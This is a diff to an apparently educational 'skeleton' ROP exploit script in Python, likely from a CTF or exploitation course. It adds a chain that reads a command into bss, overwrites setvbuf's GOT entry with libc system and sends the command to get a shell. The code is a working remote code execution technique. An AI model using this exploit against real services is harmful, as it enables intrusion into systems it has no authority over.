@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-# ROP - MEDIUM - SKELETON EXPLOIT
+# ROP - HARD - SKELETON EXPLOIT
 
 import socket
 import struct
@@ -67,7 +67,7 @@ runtil(": ")
 # the name is placed into a global buffer, unaffected by ASLR
 # we'll use this space to store a command we pass to system
 
-s.send(command + "\n")
+s.send("rop me\n")
 
 # now we are asked for a bio. this is where the vulnerability exists
 # as there is no limit to how much data we can send. this data is stored
@@ -101,6 +101,15 @@ payload += p(0)              # 0 is stdin's filedescriptor
 payload += p(setvbuf_got)    # we're writing over setvbuf's got entry
 payload += p(4)              # the address is 4 bytes
 
+# read our command back into the bss, so we have an addressable string with 
+# the command we want
+payload += p(read_plt)       # call read(0, namebuf_bss, <command_length>)
+payload += p(pppr)           # return into pop pop pop ret
+payload += p(0)              # 0 is stdin's filedescriptor
+payload += p(namebuf_bss)    # we're writing to the bss, because we know it's 
+                             #address
+payload += p(len(command)+1) # we know how much we want to read
+
 # at this point setvbuf will point to the address of system in the 
 # target's copy of libc. all calls to setvbuf are actually calls to system.
 # call system using setvbuf's hijacked GOT entry
@@ -126,6 +135,10 @@ libc_system = libc_base + libc_system_off
 
 # send the setvbuf's new address over, writing over setvbuf's got entry
 s.send(p(libc_system))
+
+# finally, send in the command we want to execute
+s.send(command)
+
 
 # a shell should now be dropped
 interact()
